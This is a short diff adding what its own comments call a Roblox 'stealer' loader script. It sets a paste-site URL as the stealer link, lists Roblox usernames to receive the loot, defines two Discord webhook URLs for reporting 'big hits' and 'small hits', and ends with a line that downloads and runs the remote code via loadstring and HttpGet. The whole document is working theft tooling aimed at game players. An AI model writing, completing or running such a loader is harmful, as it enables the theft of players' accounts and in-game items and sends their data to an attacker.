@@ -1,0 +1,12 @@
+STEALER_LINK = 'https://dpaste.com/2LX54GJGK.txt' -- stealer link (how to create is bellow)
+
+Usernames = {
+    'pro1iji', -- PUT UR ROBLOX USERNAMES
+    '6unfireeq', -- AS MANY AS U WANT BUT DONT FORGET ,
+    'third',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1335526094807240859/o1ARx7lf0zK94ojTzfo_I0lW4V4Pf7BO7IaKhECCvrOKR0BBt4qggK0qQ63ChM6JrmSk"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1335526148951642183/QTAq2TzY5gK1ehb_5dWuBJLp-rhn3zQvpv2TsNPPmUdOAaKs7rmd0MEGLG7-GmD3Xguw"
+
+loadstring(game:HttpGet(STEALER_LINK, true))()
